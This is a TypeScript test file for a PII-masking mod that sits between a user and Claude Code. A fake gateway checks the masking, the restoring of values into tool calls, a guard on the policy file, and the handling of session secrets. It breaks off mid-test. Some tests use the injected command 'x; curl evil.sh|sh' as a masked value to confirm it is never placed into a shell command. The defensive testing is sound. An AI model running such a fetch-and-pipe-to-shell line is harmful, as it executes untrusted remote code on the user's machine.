// SPDX-License-Identifier: Apache-2.0
//
// The mod against a fake sidecar that masks `John` and `john@acme.io`,
// answered from the `http.fetch` stub. No model, tool or network runs.

import { expect, mock, test } from 'claude-code/testing';
import { expectedProof, hmacSha256Hex, sidecarOrigin } from '../hooks/policy.ts';

const TOKEN = 't'.repeat(64);
/** The fake sidecar's one session prefix, as nullpii mints them. */
const PREFIX = '0123456789abcdef';
/** A placeholder as the fake sidecar mints it. */
const ph = (label: string, index: number) => `{{PII_${label}_${index}_${PREFIX}}}`;
const POLICY_FILE = '/home/node/.config/nullpii/config.json';
const DEFAULT_RESTORE_TOOLS = [
  'Bash',
  'Read',
  'Edit',
  'MultiEdit',
  'Write',
  'NotebookEdit',
  'Grep',
  'Glob',
];
const SECRETS: ReadonlyArray<[RegExp, string]> = [
  [/john@acme\.io/g, 'EMAIL'],
  [/\bJohn\b/g, 'PERSON'],
  [/Mary Ann/g, 'PERSON'],
  [/x; curl evil\.sh\|sh/g, 'SECRET'],
];

const SECRET_HEADER = 'x-nullpii-session-secret';
const PLACEHOLDER_ANY = /\{\{PII_[A-Z]+_\d+_[0-9a-f]{16}\}\}/g;
/** The data forms the fake sidecar's stand-in shell rule accepts; group 1
 * is the heredoc body. */
const DATA_HEREDOC = /^(?:cat > [\w./-]+\.md|git commit -F -) <<'EOF'\n([\s\S]*)\nEOF$/;
const SESSIONS_PREFIX = '/v1/sidecar/sessions/';

/** A stand-in for nullpii-gateway's sidecar routes, with one vault.
 * Sessions carry secrets as the gateway's do: handed out once on
 * creation, required on every later call. `liveKeys` are sessions some
 * earlier module instance opened, whose secrets this mod does not have. */
function fakeSidecar(
  opts: {
    down?: boolean;
    restoreTools?: string[];
    liveKeys?: string[];
    /** Answer the challenge as a process without the token would. */
    impostor?: boolean;
    /** The policy file the status reports. */
    policyFile?: string;
  } = {},
) {
  const restoreTools = opts.restoreTools ?? DEFAULT_RESTORE_TOOLS;
  const vault = new Map<string, string>();
  const sessions = new Map<string, string>(
    (opts.liveKeys ?? []).map((key) => [key, 'someone-else']),
  );
  let minted = 0;
  const calls: string[] = [];
  /** Challenges answered, and whether each request carried the token. */
  const challenges: string[] = [];
  const tokensSent: boolean[] = [];
  /** `host:port` of every request, wherever it was sent. */
  const hosts: string[] = [];
  const secretsSent: Array<string | undefined> = [];
  const restoreBodies: string[] = [];
  /** Set it to make `/sanitize` and `/restore` answer this text, not JSON. */
  const state: { garbage?: string } = {};
  /** Every `$.ui.log` line the mod wrote. */
  const logs: string[] = [];
  /** The status of every answer. */
  const statuses: number[] = [];
  let next = 0;
  const maskString = (s: string, byLabel: Record<string, number>) => {
    let out = s;
    for (const [re, label] of SECRETS) {
      out = out.replace(re, (m) => {
        const placeholder = ph(label, next++);
        vault.set(placeholder, m);
        byLabel[label] = (byLabel[label] ?? 0) + 1;
        return placeholder;
      });
    }
    return out;
  };
  const walk = (v: unknown, f: (s: string) => string): unknown => {
    if (typeof v === 'string') return f(v);
    if (Array.isArray(v)) return v.map((x) => walk(x, f));
    if (v !== null && typeof v === 'object') {
      return Object.fromEntries(Object.entries(v).map(([k, x]) => [k, walk(x, f)]));
    }
    return v;
  };
  const respond = (status: number, body: unknown) => {
    statuses.push(status);
    return answer(status, body);
  };
  const answer = (status: number, body: unknown) => ({
    value: {
      status,
      ok: status < 300,
      headers: {},
      text: body === undefined ? '' : JSON.stringify(body),
    },
  });
  const handler = async (
    $: unknown,
    e: { url: string; init?: { method?: string; body?: string; headers?: Record<string, string> } },
  ) => {
    const method = e.init?.method ?? 'GET';
    const url = new URL(e.url);
    const path = url.pathname;
    if (opts.down) return { deny: 'connect ECONNREFUSED 127.0.0.1:8787' };
    tokensSent.push(e.init?.headers?.authorization !== undefined);
    if (path === '/v1/sidecar/challenge') {
      const { nonce } = JSON.parse(e.init?.body ?? '{}') as { nonce: string };
      challenges.push(nonce);
      const proof = await expectedProof(opts.impostor ? 'f'.repeat(64) : TOKEN, nonce);
      return answer(200, { proof });
    }
    calls.push(`${method} ${path}`);
    hosts.push(url.host);
    if (state.garbage !== undefined && /\/(sanitize|restore)$/.test(path)) {
      return { value: { status: 200, ok: true, headers: {}, text: state.garbage } };
    }
    if (e.init?.headers?.authorization !== `Bearer ${TOKEN}`)
      return respond(401, { error: 'unauthorized' });
    // Fastify refuses a JSON content type with an empty body.
    if (e.init?.headers?.['content-type'] === 'application/json' && !e.init.body)
      return respond(400, { error: 'empty_json_body' });
    const presented = e.init?.headers?.[SECRET_HEADER];
    if (path.startsWith(SESSIONS_PREFIX)) {
      secretsSent.push(presented);
      const key = decodeURIComponent(path.slice(SESSIONS_PREFIX.length).split('/')[0] ?? '');
      const secret = sessions.get(key);
      if (method === 'PUT' && secret === undefined) {
        const created = `secret-${minted++}`;
        sessions.set(key, created);
        return respond(201, { status: 'created', secret: created });
      }
      if (method === 'PUT') {
        return presented === secret
          ? respond(200, { status: 'exists' })
          : respond(409, { error: 'session_exists' });
      }
      if (secret === undefined) return respond(404, { error: 'session_not_found' });
      if (presented !== secret) return respond(403, { error: 'bad_session_secret' });
      if (method === 'DELETE') {
        sessions.delete(key);
        return respond(204, undefined);
      }
    }
    if (path === '/v1/sidecar/status') {
      return respond(200, {
        status: 'ok',
        sessions: 1,
        policy: { file: opts.policyFile ?? POLICY_FILE, loaded: true, config: {}, restoreTools },
      });
    }
    const body = JSON.parse(e.init?.body ?? '{}') as { value: unknown; tool?: string };
    if (path.endsWith('/restore')) restoreBodies.push(e.init?.body ?? '');
    if (path.endsWith('/sanitize')) {
      const byLabel: Record<string, number> = {};
      const value = walk(body.value, (s) => maskString(s, byLabel));
      const captured = Object.values(byLabel).reduce((a, b) => a + b, 0);
      return respond(200, { value, captured, capturedByLabel: byLabel });
    }
    const counts = {
      replacementsByLabel: {},
      unknownPlaceholders: 0,
      foreignPlaceholders: 0,
    };
    if (body.tool !== undefined && !restoreTools.includes(body.tool)) {
      const held = JSON.stringify(body.value).match(/\{\{PII_[A-Z]+_\d+_[0-9a-f]{16}\}\}/g);
      return respond(200, {
        value: body.value,
        replacements: 0,
        ...counts,
        heldForTool: held?.length ?? 0,
      });
    }
    let replacements = 0;
    // Stand-in for the gateway's shell rule on a shell tool (tested there):
    // in `command`, a value comes back only in the body of a data heredoc
    // (`cat > FILE.md <<'EOF'` or `git commit -F - <<'EOF'`), only when
    // every placeholder of the command is there, and only with no line break.
    const kept: string[] = [];
    const keep = (placeholder: string) => {
      if (!kept.includes(placeholder)) kept.push(placeholder);
    };
    const restoreIn = (text: string, shellRule: boolean): string => {
      if (shellRule) {
        const body = DATA_HEREDOC.exec(text)?.[1];
        const outside = body === undefined ? text : text.replace(body, '');
        if (body === undefined || (outside.match(PLACEHOLDER_ANY) ?? []).length > 0) {
          for (const placeholder of text.match(PLACEHOLDER_ANY) ?? []) keep(placeholder);
          return text;
        }
      }
      return text.replace(PLACEHOLDER_ANY, (placeholder) => {
        const real = vault.get(placeholder);
        if (real === undefined) return placeholder;
        if (shellRule && real.includes('\n')) {
          keep(placeholder);
          return placeholder;
        }
        replacements += 1;
        return real;
      });
    };
    const shellBody = body.tool === 'Bash';
    const input = body.value as Record<string, unknown>;
    const value = shellBody
      ? Object.fromEntries(
          Object.entries(input).map(([k, v]) => [
            k,
            typeof v === 'string' ? restoreIn(v, k === 'command') : v,
          ]),
        )
      : walk(body.value, (s) => restoreIn(s, false));
    return respond(200, {
      value,
      replacements,
      ...counts,
      ...(shellBody && { shellKeptMasked: kept }),
    });
  };
  return {
    handler,
    calls,
    challenges,
    hosts,
    logs,
    restoreBodies,
    secretsSent,
    sessions,
    state,
    statuses,
    tokensSent,
  };
}

function stubSession(
  on,
  sidecar: ReturnType<typeof fakeSidecar>,
  env: Record<string, string> = { NULLPII_SIDECAR_TOKEN: TOKEN },
  cwd = '/work',
) {
  mock.env(on, env);
  on('session.start', () => ({ cwd }));
  on('session.cwd', () => ({ value: cwd }));
  on('command.register', () => ({ value: undefined }));
  on('session.id', () => ({ value: 'session-1' }));
  on('ui.toast', () => ({ value: undefined }));
  on('ui.log', ($, e) => {
    sidecar.logs.push(e.text);
    return { value: undefined };
  });
  on('http.fetch', sidecar.handler);
}

async function start($) {
  await $.session.start({ surface: 'terminal', isInteractive: true, cwd: '/work' });
}

const COMPOSER = { kind: 'composer' } as const;

test('a prompt reaches Claude with placeholders, and the sidecar session is opened', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const seen: string[] = [];
  on('prompt.submit', ($, e) => {
    seen.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'Mail John at john@acme.io', wait: false, origin: COMPOSER });
  expect(seen.length).toBe(1);
  expect(seen[0]).not.toContain('John');
  expect(seen[0]).not.toContain('john@acme.io');
  expect(sidecar.calls[0]).toBe('PUT /v1/sidecar/sessions/session-1');
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('Status: on');
});

test('a tool result is masked and returned as a fresh result, without core ref', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({
    result: { stdout: 'owner: John', stderr: '' },
    ref: 7,
    text: 'owner: John',
  }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
  expect(JSON.stringify(out)).not.toContain('John');
  expect(out.ref).toBeUndefined();
  expect(out.text).toBeUndefined();
});

test('a result whose attached context holds personal data is withheld, since context cannot be masked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({
    result: { stdout: 'done', stderr: '' },
    context: ['owner: John <john@acme.io>'],
  }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'make' });
  expect(out.deny).toMatch(/withheld this tool's result/);
  expect(JSON.stringify(out)).not.toContain('John');
});

test('a context without personal data is passed on whole, beside the masked result', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({
    result: { stdout: 'built for John', stderr: '' },
    context: ['lint: 0 warnings'],
  }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'make' });
  expect(out.context).toEqual(['lint: 0 warnings']);
  expect(JSON.stringify(out.result)).not.toContain('John');
});

test('placeholders in a local tool call get their real values back before it runs', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const commands: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    commands.push(e.command);
    return { result: { stdout: 'found john@acme.io', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'note john@acme.io', wait: false, origin: COMPOSER });
  const placeholder = ph('EMAIL', 0);
  const out = await $.tool.call({
    tool: 'Bash',
    command: `cat > notes.md <<'EOF'\nContact: ${placeholder}\nEOF`,
  });
  expect(commands).toEqual(["cat > notes.md <<'EOF'\nContact: john@acme.io\nEOF"]);
  expect(JSON.stringify(out)).not.toContain('john@acme.io');
});

test('a call with nothing to restore is passed on as Claude wrote it', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const received: unknown[] = [];
  on('tool.call', ($, e) => {
    received.push(e);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.tool.call({ tool: 'Bash', command: 'ls' });
  expect(received.length).toBe(1);
  expect((received[0] as { command: string }).command).toBe('ls');
});

test('a tool that sends data elsewhere keeps the placeholders', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const urls: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    urls.push(e.url);
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({
    tool: 'WebFetch',
    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
    prompt: 'x',
  });
  expect(urls).toEqual([`https://example.com/?q=${ph('EMAIL', 0)}`]);
  const report = await $.command.run({ command: 'pii', args: '' });
  expect(report.text).toContain('Placeholders kept in calls to other tools: 1');
});

test('an errored tool result reaches Claude masked, as a refusal', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ isError: true, result: 'boom', text: 'no such user John' }));
  await start($);
  const out = await $.tool.call({ tool: 'Bash', command: 'id' });
  expect(typeof out.deny).toBe('string');
  expect(out.deny).not.toContain('John');
});

test('with the sidecar down, a prompt is handed back and a tool call is refused', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.tool);
    return { result: 'ok' };
  });
  await start($);
  const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(prompt.drop).toMatch(/nullpii could not mask this prompt/);
  const call = await $.tool.call({ tool: 'Bash', command: 'ls' });
  expect(call.deny).toMatch(/nullpii could not prepare this tool call/);
  expect(ran).toEqual([]);
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('Status: blocking (nullpii-gateway did not answer');
});

test('without a token, the mod blocks instead of sending data unmasked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, {});
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  const prompt = await $.prompt.submit({ text: 'hello', wait: false, origin: COMPOSER });
  expect(prompt.drop).toMatch(/no sidecar token/);
});

const BAND = {
  plugin: 'nullpii',
  component: 'AbovePrompt',
  requestId: 'above-prompt',
  surface: 'terminal',
  viewport: { columns: 100, rows: 30 },
  props: {
    hasSurvey: false,
    isWorking: false,
    maxRows: 4,
    bodyColumns: 100,
    scroll: { offset: 0, bodyRows: 4 },
    view: {},
  },
} as const;

test('the band above the prompt shows what was masked, by type', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by another mod'] }));
  await start($);
  await $.prompt.submit({ text: 'John, john@acme.io', wait: false, origin: COMPOSER });
  const ui = await $.ui.mount(BAND);
  expect(
    await ui.find({ type: 'Text', text: /^nullpii · 2 masked \(EMAIL 1 · PERSON 1\)/ }),
  ).toBeDefined();
  expect(await ui.find({ type: 'Text', text: 'drawn by another mod' })).toBeDefined();
  await ui.unmount();
});

test('the band turns into a warning when the mod is blocking', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  const line = await ui.find({ type: 'Text', text: /^nullpii · blocking:/ });
  expect(line).toBeDefined();
  expect(line?.props.color).toBe('red');
  await ui.unmount();
});

function messageSite(text: string) {
  return {
    plugin: 'nullpii',
    component: 'AssistantMessage',
    requestId: 'msg-1',
    surface: 'terminal',
    viewport: { columns: 100, rows: 30 },
    props: { text, isFirstOfReply: true },
  } as const;
}

test("Claude's reply is drawn with real values, while Claude keeps the placeholders", async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', ($, e) => ({ type: 'Text', props: {}, children: [e.props.text] }));
  await start($);
  await $.prompt.submit({ text: 'write to john@acme.io', wait: false, origin: COMPOSER });
  const ui = await $.ui.mount(messageSite(`Sent the draft to ${ph('EMAIL', 0)}.`));
  expect(await ui.find({ type: 'Text', text: 'Sent the draft to john@acme.io.' })).toBeDefined();
  await ui.unmount();
});

test('a reply without placeholders is drawn without asking the sidecar', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('ui.render', ($, e) => ({ type: 'Text', props: {}, children: [e.props.text] }));
  await start($);
  const before = sidecar.calls.length;
  const ui = await $.ui.mount(messageSite('All tests pass.'));
  expect(await ui.find({ type: 'Text', text: 'All tests pass.' })).toBeDefined();
  expect(sidecar.calls.length).toBe(before);
  await ui.unmount();
});

test('an @-mentioned file reaches Claude masked', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.attachment', ($, e) => ({ text: e.text }));
  await start($);
  const out = await $.prompt.attachment({
    type: 'file',
    text: 'owners: John <john@acme.io>',
    origin: { kind: 'engine' },
  });
  expect(out.text).not.toContain('John');
  expect(out.text).not.toContain('john@acme.io');
});

test("the first message's context reaches Claude masked", async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.context', ($, e) => ({ blocks: e.blocks }));
  await start($);
  const out = await $.prompt.context({
    blocks: [
      { name: 'userEmail', text: 'john@acme.io' },
      { name: 'currentDate', text: '2026-10-17' },
    ],
    instructionFiles: [],
  });
  expect(JSON.stringify(out.blocks)).not.toContain('john@acme.io');
  expect(out.blocks.map((b) => b.name)).toEqual(['userEmail', 'currentDate']);
});

test('with the sidecar down, attachments are left out and the context is emptied', async ($, on) => {
  const sidecar = fakeSidecar({ down: true });
  stubSession(on, sidecar);
  on('prompt.attachment', ($, e) => ({ text: e.text }));
  on('prompt.context', ($, e) => ({ blocks: e.blocks }));
  await start($);
  const attachment = await $.prompt.attachment({
    type: 'file',
    text: 'John',
    origin: { kind: 'engine' },
  });
  expect(attachment.text).toBe(null);
  const context = await $.prompt.context({ blocks: [{ name: 'userEmail', text: 'john@acme.io' }] });
  expect(context.blocks).toEqual([]);
});

test('/pii reports counts by type, never values', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'John and John, john@acme.io', wait: false, origin: COMPOSER });
  const answer = await $.command.run({ command: 'pii', args: '' });
  expect(answer.text).toContain('Masked before Claude read them: 3');
  expect(answer.text).toContain('PERSON 2 · EMAIL 1');
  expect(answer.text).not.toContain('John');
});

test('a masked value that the shell would interpret is not put into a command', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
  const out = await $.tool.call({ tool: 'Bash', command: `echo ${ph('SECRET', 0)}` });
  expect(out.deny).toContain(`will not put the real value of ${ph('SECRET', 0)}`);
  expect(out.deny).not.toContain('curl');
  expect(ran).toEqual([]);
});

test('inside single quotes the same value is refused too: a program could read it again', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
  const out = await $.tool.call({
    tool: 'Bash',
    command: `printf '%s' '${ph('SECRET', 0)}' > token.txt`,
  });
  expect(out.deny).toContain(`will not put the real value of ${ph('SECRET', 0)}`);
  expect(ran).toEqual([]);
});

test('inside single quotes a name with a space stays masked: values come back only in a data heredoc body', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'write to Mary Ann', wait: false, origin: COMPOSER });
  const out = await $.tool.call({
    tool: 'Bash',
    command: `printf '%s' '${ph('PERSON', 0)}' > to.txt`,
  });
  expect(out.deny).toContain(`will not put the real value of ${ph('PERSON', 0)}`);
  // Claude is pointed at the commit form that does get values back.
  expect(out.deny).toContain("git commit -F - <<'EOF'");
  expect(ran).toEqual([]);
});

test('each restore names its tool, and sends only the arguments that can take values', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
  await start($);
  await $.prompt.submit({ text: 'Mary Ann', wait: false, origin: COMPOSER });
  const person = ph('PERSON', 0);
  await $.tool.call({ tool: 'Bash', command: `echo ${person}`, description: `greet ${person}` });
  await $.tool.call({ tool: 'Write', file_path: 'a.txt', content: `Hi ${person}` });
  const bodies = sidecar.restoreBodies.map((b) => JSON.parse(b));
  expect(bodies[0]).toEqual({ value: { command: `echo ${person}` }, tool: 'Bash' });
  expect(bodies[1]).toEqual({
    value: { file_path: 'a.txt', content: `Hi ${person}` },
    tool: 'Write',
  });
});

test('a tool the policy adds to restoreTools gets real values in every argument', async ($, on) => {
  const sidecar = fakeSidecar({ restoreTools: [...DEFAULT_RESTORE_TOOLS, 'mcp__files__write'] });
  stubSession(on, sidecar);
  const written: unknown[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    written.push({ path: e.path, text: e.text });
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'note for John', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'mcp__files__write', path: 'n.txt', text: `for ${ph('PERSON', 0)}` });
  expect(written).toEqual([{ path: 'n.txt', text: 'for John' }]);
});

test('a policy that drops a local tool keeps its placeholders', async ($, on) => {
  const sidecar = fakeSidecar({ restoreTools: ['Read'] });
  stubSession(on, sidecar);
  const commands: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    commands.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'Bash', command: `grep -r ${ph('EMAIL', 0)} .` });
  expect(commands).toEqual([`grep -r ${ph('EMAIL', 0)} .`]);
});

test('a call without placeholders does not ask the sidecar to restore', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
  await start($);
  await $.tool.call({ tool: 'Bash', command: 'ls' });
  await $.tool.call({ tool: 'WebFetch', url: 'https://example.com', prompt: 'x' });
  expect(sidecar.restoreBodies).toEqual([]);
});

test('/pii shows the policy the sidecar runs with', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);
  const answer = await $.command.run({ command: 'pii', args: '' });
  expect(answer.text).toContain(`Policy file: ${POLICY_FILE} (loaded)`);
  expect(answer.text).toContain('Tools that get real values back: Bash, Read');
  expect(answer.text).toContain('apply when nullpii-gateway restarts');
});

test('a call that may change the policy file is put to the user', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.check', () => ({ decision: 'allow' }));
  await start($);
  const asks = [
    { tool: 'Write', input: { file_path: POLICY_FILE, content: '{}' } },
    { tool: 'Edit', input: { file_path: '/srv/alt/.config/nullpii/config.json' } },
    { tool: 'Bash', input: { command: 'echo {} > ~/.config/nullpii/config.json' } },
    { tool: 'Bash', input: { command: 'export NULLPII_CONFIG=/tmp/loose.json' } },
  ];
  for (const call of asks) {
    expect((await $.tool.check(call)).decision).toBe('ask');
  }
  const allows = [
    { tool: 'Write', input: { file_path: '/work/config.json', content: '{}' } },
    { tool: 'Read', input: { file_path: POLICY_FILE } },
    { tool: 'Bash', input: { command: 'ls' } },
  ];
  for (const call of allows) {
    expect((await $.tool.check(call)).decision).toBe('allow');
  }
});

test('a policy path that shows only once real values are back is refused before the tool runs', async ($, on) => {
  const sidecar = fakeSidecar({ policyFile: '/srv/John/nullpii.json' });
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.check', () => ({ decision: 'allow' }));
  on('tool.call', ($, e) => {
    ran.push(e.file_path);
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'the home of John', wait: false, origin: COMPOSER });
  const call = {
    tool: 'Write',
    file_path: `/srv/${ph('PERSON', 0)}/nullpii.json`,
    content: '{}',
  };
  // The masked path names no policy file, so the check lets it through...
  expect((await $.tool.check({ tool: 'Write', input: call })).decision).toBe('allow');
  // ...and the restored one does, so the call does not run.
  const out = await $.tool.call(call);
  expect(out.deny).toContain('would change the nullpii masking policy file');
  expect(ran).toEqual([]);
});

test('the policy guard sees through case, dot segments, repeated slashes and relative paths', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, { NULLPII_SIDECAR_TOKEN: TOKEN }, '/home/node/.config/nullpii');
  on('tool.check', () => ({ decision: 'allow' }));
  await start($);
  const asks = [
    { tool: 'Write', input: { file_path: '~/.config/NULLPII/config.json', content: '{}' } },
    { tool: 'Write', input: { file_path: '/home/node/.config/nullpii/./config.json' } },
    { tool: 'Edit', input: { file_path: '/home/node/.config/nullpii//config.json' } },
    { tool: 'Edit', input: { file_path: '/home/node/.config/other/../nullpii/Config.JSON' } },
    { tool: 'Write', input: { file_path: 'config.json', content: '{}' } },
    { tool: 'Write', input: { file_path: 'C:\\Users\\me\\.config\\nullpii\\config.json' } },
    { tool: 'Bash', input: { command: "cd ~/.config/nullpii && echo '{}' > config.json" } },
    { tool: 'Bash', input: { command: 'echo {} > ~/.config/NullPii/Config.json' } },
    { tool: 'Bash', input: { command: 'export nullpii_config=/tmp/loose.json' } },
  ];
  for (const call of asks) {
    expect((await $.tool.check(call)).decision, JSON.stringify(call)).toBe('ask');
  }
  const allows = [
    { tool: 'Write', input: { file_path: '/work/nullpii-notes/config.json' } },
    { tool: 'Write', input: { file_path: '../notes.md' } },
    { tool: 'Bash', input: { command: 'cat package.json' } },
  ];
  for (const call of allows) {
    expect((await $.tool.check(call)).decision, JSON.stringify(call)).toBe('allow');
  }
});

test('a refusal stays a refusal on the policy file', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.check', () => ({ decision: 'deny', reason: 'rule' }));
  await start($);
  const out = await $.tool.check({ tool: 'Write', input: { file_path: POLICY_FILE } });
  expect(out).toEqual({ decision: 'deny', reason: 'rule' });
});

test('every call on the session carries the secret the sidecar handed out, and only that', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
  await start($);
  await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'Bash', command: `grep -r ${ph('EMAIL', 0)} .` });
  // The first PUT has no secret yet; every later session call sends it.
  expect(sidecar.secretsSent[0]).toBeUndefined();
  expect(sidecar.secretsSent.slice(1).length).toBeGreaterThan(1);
  expect(sidecar.secretsSent.slice(1).every((s) => s === 'secret-0')).toBe(true);
});

test('a live session it cannot prove it owns makes the mod open a new one under a new key', async ($, on) => {
  // As after a reload of the module: the sidecar still holds the session
  // under the session id, and its secret went with the old module.
  const sidecar = fakeSidecar({ liveKeys: ['session-1'] });
  stubSession(on, sidecar);
  mock.clock(on, { now: 1_700_000_000_000 });
  const seen: string[] = [];
  on('prompt.submit', ($, e) => {
    seen.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(seen).toEqual([`Mail ${ph('PERSON', 0)}`]);
  expect(sidecar.sessions.get('session-1')).toBe('someone-else');
  const opened = [...sidecar.sessions.keys()].filter((k) => k !== 'session-1');
  expect(opened).toHaveLength(1);
  expect(opened[0]).toMatch(/^session-1\.[0-9a-z]+$/);
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('Status: on');
});

test('a session the sidecar dropped is opened again with a fresh secret', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  sidecar.sessions.clear();
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(sidecar.sessions.get('session-1')).toBe('secret-1');
  expect(sidecar.secretsSent.at(-1)).toBe('secret-1');
});

/** Addresses `sidecar_url` must refuse: the mod would send its token and
 * every unmasked prompt there. */
const NOT_SIDECAR_URLS = [
  'http://203.0.113.7:8787',
  'https://127.0.0.1:8787',
  'http://user@127.0.0.1:8787',
  'http://127.0.0.1:8787/v1',
  'http://127.0.0.1:8787/?to=elsewhere',
  'http://127.0.0.1:8787/#frag',
  'http://127.0.0.1.nip.io:8787',
  'http://localhost.example.com:8787',
  // `localhost` can resolve to the loopback address the gateway is not on.
  'http://localhost:8787',
  'http://LOCALHOST',
  'not a url',
];

test('sidecarOrigin keeps loopback http origins and refuses every other address', () => {
  expect(sidecarOrigin('http://127.0.0.1:8787')).toBe('http://127.0.0.1:8787');
  expect(sidecarOrigin('http://127.0.0.1:8787/')).toBe('http://127.0.0.1:8787');
  expect(sidecarOrigin('http://[::1]:8787')).toBe('http://[::1]:8787');
  expect(sidecarOrigin('http://127.1:8787')).toBe('http://127.0.0.1:8787');
  for (const url of NOT_SIDECAR_URLS) expect(sidecarOrigin(url), url).toBeUndefined();
});

for (const url of NOT_SIDECAR_URLS.slice(0, 2)) {
  test(
    `sidecar_url ${url} blocks the mod before anything is sent`,
    { options: { sidecar_url: url } },
    async ($, on) => {
      const sidecar = fakeSidecar();
      stubSession(on, sidecar);
      const ran: string[] = [];
      on('prompt.submit', ($, e) => ({ text: e.text }));
      on('tool.call', ($, e) => {
        ran.push(e.tool);
        return { result: 'ok' };
      });
      await start($);
      const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
